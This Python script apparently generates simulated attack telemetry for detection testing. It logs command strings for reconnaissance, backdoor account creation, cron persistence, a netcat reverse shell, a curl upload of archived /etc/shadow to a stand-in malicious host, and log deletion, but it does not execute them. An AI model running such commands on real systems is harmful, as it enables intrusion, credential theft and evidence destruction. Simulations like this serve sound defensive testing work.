#!/usr/bin/env python3
import time
import json
import subprocess
import os
from datetime import datetime

def log_attack_event(image, cmdline, user='attacker', category='process_creation', product='linux'):
    timestamp = datetime.now().isoformat() + 'Z'
    log_entry = {
        'timestamp': timestamp,
        'Image': image,
        'CommandLine': cmdline,
        'User': user,
        'category': category,
        'product': product
    }
    
    with open('/data/events.ndjson', 'a') as f:
        f.write(json.dumps(log_entry) + '\n')
    
    print(f'[ATTACK] {cmdline}')

# Simulate different attack stages
print('=== ATTACK SIMULATION STARTED ===')

# 1. Reconnaissance
log_attack_event('/bin/ps', 'ps aux', 'attacker')
log_attack_event('/usr/bin/whoami', 'whoami', 'attacker')
log_attack_event('/bin/cat', 'cat /etc/passwd', 'attacker')
log_attack_event('/usr/bin/find', 'find /home -type f -name "*.ssh"', 'attacker')

time.sleep(1)

# 2. Privilege Escalation attempts
log_attack_event('/usr/bin/sudo', 'sudo -l', 'attacker')
log_attack_event('/bin/bash', 'bash -c "echo attacker:password123 | chpasswd"', 'root')
log_attack_event('/usr/sbin/useradd', 'useradd -m -s /bin/bash backdoor', 'root')

time.sleep(1)

# 3. Persistence
log_attack_event('/usr/bin/crontab', 'crontab -e', 'attacker')
log_attack_event('/bin/echo', 'echo "*/5 * * * * /tmp/backdoor.sh" >> /var/spool/cron/crontabs/root', 'root')
log_attack_event('/bin/nc', 'nc -e /bin/bash 10.0.0.100 4444', 'root')

time.sleep(1)

# 4. Data Exfiltration
log_attack_event('/usr/bin/tar', 'tar -czf /tmp/data.tar.gz /home /etc/passwd /etc/shadow', 'attacker')
log_attack_event('/usr/bin/curl', 'curl -X POST -F "file=@/tmp/data.tar.gz" http://malicious-site.com/upload', 'attacker')
log_attack_event('/bin/rm', 'rm -rf /var/log/auth.log /var/log/syslog', 'root')

print('=== ATTACK SIMULATION COMPLETED ===')
